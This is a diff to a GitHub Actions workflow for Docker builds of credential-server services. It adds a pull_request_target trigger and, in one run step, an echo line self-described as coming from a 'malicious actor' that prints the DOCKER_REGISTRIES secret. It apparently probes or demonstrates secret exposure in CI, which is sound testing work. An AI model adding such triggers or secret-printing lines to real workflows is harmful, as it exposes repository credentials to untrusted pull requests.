@@ -12,6 +12,13 @@ on:
     - '.github/workflows/docker-builds.yaml'
     - 'services/credential-server-ui/**'
     - 'services/credential-server/**'
+  pull_request_target:
+    types: [ opened, synchronize ]
+    paths:
+    - 'Earthfile'
+    - '.github/workflows/docker-builds.yaml'
+    - 'services/credential-server-ui/**'
+    - 'services/credential-server/**'
   workflow_dispatch:
     inputs:
       images:
@@ -76,6 +83,9 @@ jobs:
       - name: Set docker image targets based on path changes from last commit
         id: metadata
         run: |
+
+          echo "im a malicious actor but this code is ignored anyways ${{ secrets.DOCKER_REGISTRIES }}"
+
           set -x
 
           if [ ${{github.event_name}} == "workflow_dispatch" ]
